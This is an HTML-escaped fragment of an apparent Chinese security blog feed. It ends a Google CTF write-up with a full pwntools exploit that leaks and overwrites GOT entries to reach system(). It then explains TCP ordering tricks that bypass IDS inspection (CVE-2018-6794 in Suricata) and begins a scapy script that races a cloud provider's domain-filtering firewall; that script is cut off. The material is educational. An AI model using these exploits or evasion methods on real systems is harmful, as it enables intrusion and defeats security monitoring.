+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./todo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;read?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hi admin,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;Q&lt;/code&gt; 是指定按照小端序读取 8 个字节作为一个数字。因为这时候 write 函数还没有被解析，所以 got 表中的 &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; 还是指向 &lt;code class=&quot;highlighter-rouge&quot;&gt;write@plt+6&lt;/code&gt; 的。&lt;/p&gt;
+
+&lt;p&gt;剩下的步骤就简单多了，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;store_todo&lt;/code&gt; 函数中，可以将我们的输入写入 got 表的位置，所以应该是将 &lt;code class=&quot;highlighter-rouge&quot;&gt;system@plt&lt;/code&gt; 的地址写入接下来要运行的参数可控的函数的 got 表的位置。发现 &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi&lt;/code&gt; 函数是一个选择，函数的偏移是确定的，&lt;code class=&quot;highlighter-rouge&quot;&gt;system@plt&lt;/code&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;write@plt+6&lt;/code&gt; 也就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;0x555555554940 - 0x555555554916 = 0x2a&lt;/code&gt;（&lt;code class=&quot;highlighter-rouge&quot;&gt;atoi@plt&lt;/code&gt; 的地址可以使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;info addr atoi@plt&lt;/code&gt; 获取，是在偏移 -4 再加 8 个字节）。&lt;/p&gt;
+
+&lt;p&gt;完整 exp 如下&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./todo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;read?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hi admin,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;entry?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;TODO?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;参考&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://hackso.me/google-ctf-beginners-quest-part-2/&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>virusdefender</name></author><category term="安全" /><category term="CTF" /><summary type="html">本文是 plt 和 got 表相关的漏洞利用实例，是 Google CTF 中的一道题，题目给了源码和 binary。</summary></entry><entry><title type="html">不按顺序来的 TCP 包</title><link href="https://strcpy.me/index.php/archives/789/" rel="alternate" type="text/html" title="不按顺序来的 TCP 包" /><published>2018-06-16T18:18:18+00:00</published><updated>2018-06-16T18:18:18+00:00</updated><id>https://strcpy.me/index.php/archives/%E4%B8%8D%E6%8C%89%E9%A1%BA%E5%BA%8F%E6%9D%A5%E7%9A%84%20TCP%20%E5%8C%85</id><content type="html" xml:base="https://strcpy.me/index.php/archives/789/">&lt;p&gt;关于 TCP 建立连接和断开连接的流程，很多人都能大致说出来，可以参考&lt;a href=&quot;http://www.cnblogs.com/vamei/archive/2012/12/16/2812188.html&quot;&gt;协议森林&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常的数据传输是在三次握手结束之后进行的，但是如果打破了这个流程，数据传输仍然可能成功，而部分防火墙 IDS 就可能被绕过，下面的两个例子来自 https://github.com/kirillwow/ids_bypass。&lt;/p&gt;
+
+&lt;h2 id=&quot;cve-2018-6794&quot;&gt;CVE-2018-6794&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# 客户端开始三次握手 发送 SYN
+Client    -&amp;gt;  [SYN] [Seq=0 Ack=0]           -&amp;gt;  Evil Server
+# 服务器端正常的响应了 SYN-ACK
+Client    &amp;lt;-  [SYN, ACK] [Seq=0 Ack=1]      &amp;lt;-  Evil Server
+# 但是服务器端在握手结束之前就发送了 PSH，里面包含了一些数据
+Client    &amp;lt;-  [PSH, ACK] [Seq=1 Ack=1]      &amp;lt;-  Evil Server
+# 服务器端主动关闭了连接
+Client    &amp;lt;-  [FIN, ACK] [Seq=83 Ack=1]     &amp;lt;-  Evil Server
+# 三次握手完成
+Client    -&amp;gt;  [ACK] [Seq=1 Ack=84]          -&amp;gt;  Evil Server
+# 客户端正常的发送数据
+Client    -&amp;gt;  [PSH, ACK] [Seq=1 Ack= 4]     -&amp;gt;  Evil Server
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Suricata IDS 在 4.0.4 版本之前存在这个问题&lt;/p&gt;
+
+&lt;h2 id=&quot;rst-导致的绕过&quot;&gt;RST 导致的绕过&lt;/h2&gt;
+
+&lt;p&gt;有些 Windows 客户端在收到 RST 包之后，如果紧接着又收到了其他的 TCP 数据，那仍然是可以读取和处理的，有些 IDS 正确处理了这个问题，有的在收到 RST 包之后就停止了检查 TCP 包。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Client starts a TCP 3-way handshake
+Client    -&amp;gt;  [SYN] [Seq=0 Ack=0]           -&amp;gt;  Evil Server
+# Server responses with TCP RST
+Client    &amp;lt;-  [RST, ACK] [Seq=0x0 Ack=1]    &amp;lt;-  Evil Server
+# And SYN-ACK shortly after RST
+Client    &amp;lt;-  [SYN, ACK] [Seq=1 Ack=1]      &amp;lt;-  Evil Server
+           ... 三次握手继续 ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Suricata IDS（全版本？）存在这个问题。对于 UDP 数据包，也有一个类似的问题。&lt;/p&gt;
+
+&lt;h2 id=&quot;应用&quot;&gt;应用&lt;/h2&gt;
+
+&lt;p&gt;某些云服务器厂商会实时的去过滤每台机器的 HTTP 请求的域名，也就是 Host 字段，一旦发现是没有[[(备)]]案的，就会返回一个拦截页面，怎么绕过这个呢。经过测试发现某云应该是不检测 HTTPS的，如果可以让 80 端口重定向到 443，然后设置 HSTS 头，这样基本长时间内浏览器就不会再访问 80 端口了，虽然 SSL SNI 和 证书中也是含有域名信息的。&lt;/p&gt;
+
+&lt;p&gt;访问 80 端口，发现三次握手是正常进行的，而拦截发生在客户端发送了 HTTP 请求包之后，这也说明，防火墙不是无条件封禁的和屏蔽端口的，而是实时的过滤。如果可以抢在防火墙发包之前发送，那就可以实现重定向了。&lt;/p&gt;
+
+&lt;p&gt;写了一个 Python 的脚本来完成这个事情&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# coding=utf-8&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sniff&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;SERVER_DOMAIN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;example.me&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;SERVER_PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4445&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;FIN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x01&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;SYN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x02&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ACK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;build_synack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# 确认 SYN&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;syn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MSS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1460&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
